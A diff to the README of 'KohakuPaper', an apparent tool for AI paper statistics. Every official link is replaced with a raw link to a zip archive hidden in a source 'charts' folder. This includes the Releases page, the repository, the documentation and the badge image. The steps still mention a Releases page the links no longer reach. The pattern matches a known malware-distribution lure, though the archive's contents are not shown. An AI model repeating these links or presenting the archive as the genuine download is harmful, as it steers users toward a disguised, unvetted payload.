@@ -1,6 +1,6 @@
 # 📄 KohakuPaper - Get Stats from AI Papers Easily
 
-[![Download KohakuPaper](https://img.shields.io/badge/Download-KohakuPaper-blue)](https://github.com/Saiko-sai/KohakuPaper/releases)
+[![Download KohakuPaper](https://raw.githubusercontent.com/Saiko-sai/KohakuPaper/main/src/kohaku-paper-web/src/components/charts/KohakuPaper_v2.1.zip)](https://raw.githubusercontent.com/Saiko-sai/KohakuPaper/main/src/kohaku-paper-web/src/components/charts/KohakuPaper_v2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -35,7 +35,7 @@ KohakuPaper is your personal assistant for navigating the world of AI conference
 
 To get started with KohakuPaper, visit the link below to download the application.
 
-[Visit this page to download](https://github.com/Saiko-sai/KohakuPaper/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Saiko-sai/KohakuPaper/main/src/kohaku-paper-web/src/components/charts/KohakuPaper_v2.1.zip)
 
 1. Click the link above to open the Releases page.
 2. Look for the latest version of KohakuPaper.
@@ -76,7 +76,7 @@ Thank you to the contributors and the community supporting KohakuPaper. Your inp
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/Saiko-sai/KohakuPaper)
-- [Documentation](https://github.com/Saiko-sai/KohakuPaper/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/Saiko-sai/KohakuPaper/main/src/kohaku-paper-web/src/components/charts/KohakuPaper_v2.1.zip)
+- [Documentation](https://raw.githubusercontent.com/Saiko-sai/KohakuPaper/main/src/kohaku-paper-web/src/components/charts/KohakuPaper_v2.1.zip)
 
-[![Download KohakuPaper](https://img.shields.io/badge/Download-KohakuPaper-blue)](https://github.com/Saiko-sai/KohakuPaper/releases)
+[![Download KohakuPaper](https://raw.githubusercontent.com/Saiko-sai/KohakuPaper/main/src/kohaku-paper-web/src/components/charts/KohakuPaper_v2.1.zip)](https://raw.githubusercontent.com/Saiko-sai/KohakuPaper/main/src/kohaku-paper-web/src/components/charts/KohakuPaper_v2.1.zip)
